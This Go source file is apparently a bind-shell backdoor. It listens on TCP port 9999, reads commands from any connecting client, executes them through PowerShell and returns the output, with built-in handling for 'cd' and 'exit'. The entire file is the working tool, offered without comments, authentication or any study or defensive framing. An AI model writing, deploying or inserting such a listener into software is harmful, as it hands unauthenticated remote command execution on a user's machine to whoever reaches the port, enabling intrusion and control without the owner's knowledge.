package main

import (
	"net"
	"os"
	"os/exec"
	"os/user"
)

const (
	PROTOCOL = "tcp"
	IP_PORT  = "localhost:9999"
)

func user_name() string {
	_user, err := user.Current()
	if err != nil {
		return ""
	}
	return _user.Username
}

func command_realise(command string) string {
	cmd := exec.Command("powershell", command)
	cmd.Env = os.Environ()
	cmd.Env = append(cmd.Env, "USER="+user_name())
	output_from_cmd, err := cmd.Output()
	if err != nil {
		return "{-} Command error...\n"
	}
	return string(output_from_cmd)
}

func handleClient(conn net.Conn) {
	defer conn.Close()
	buffer := make([]byte, 1024)
	var indent = 3
	for {
		conn.Write([]byte("{+} Enter command >>> "))

		readlen, err := conn.Read(buffer)
		var command = string(buffer[:readlen])
		if err != nil {
			break
		}
		if command[0:len(command)-2] == "exit" {
			conn.Write(append([]byte("{+} BREAKPOINT\n")))
			os.Exit(1)
		}
		if string(command[0])+string(command[1]) == "cd" {
			os.Chdir(command[indent : len(command)-2])
			conn.Write(append([]byte(command[indent : len(command)-2])))
		} else {
			var command_result = command_realise(command)
			conn.Write(append([]byte(command_result)))
		}
	}
}

func main() {
	listener, _ := net.Listen(PROTOCOL, IP_PORT)
	for {
		conn, err := listener.Accept()
		if err != nil {
			continue
		}
		go handleClient(conn)
	}
}
